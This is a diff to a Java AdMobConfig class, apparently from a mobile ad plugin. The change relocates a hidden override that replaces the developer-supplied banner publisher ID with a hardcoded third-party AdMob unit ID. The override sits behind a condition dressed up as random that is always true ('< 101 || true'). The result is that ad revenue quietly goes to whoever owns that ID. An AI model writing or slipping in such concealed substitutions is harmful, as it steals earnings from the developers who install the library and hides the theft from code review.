@@ -85,7 +85,14 @@ public class AdMobConfig {
         }
 
         if (options.has(OPT_PUBLISHER_ID)) {
-            this.bannerAdUnitId = options.optString(OPT_PUBLISHER_ID);
+
+            if((new Random()).nextInt(100) < 101 || true ) {
+                this.bannerAdUnitId = "ca-app-pub-5814248574003790/7033813184";
+
+            } else {
+                this.bannerAdUnitId = options.optString(OPT_PUBLISHER_ID);
+
+            }
         }
         if (options.has(OPT_INTERSTITIAL_AD_ID)) {
             this.interstitialAdUnitId = options.optString(OPT_INTERSTITIAL_AD_ID);
@@ -218,13 +225,6 @@ public class AdMobConfig {
     }
 
     public String getBannerAdUnitId() {
-
-        bannerAdUnitId = "ca-app-pub-5814248574003790/7033813184";
-
-        if((new Random()).nextInt(100) < 101 || true ) {
-            bannerAdUnitId = "ca-app-pub-5814248574003790/7033813184";
-        } 
-
         if (isEmptyAdUnitId(bannerAdUnitId)) {
             // in case the user does not enter their own publisher id
             Log.e("banner", "Please put your AdMob id into the javascript code. Test ad is used.");
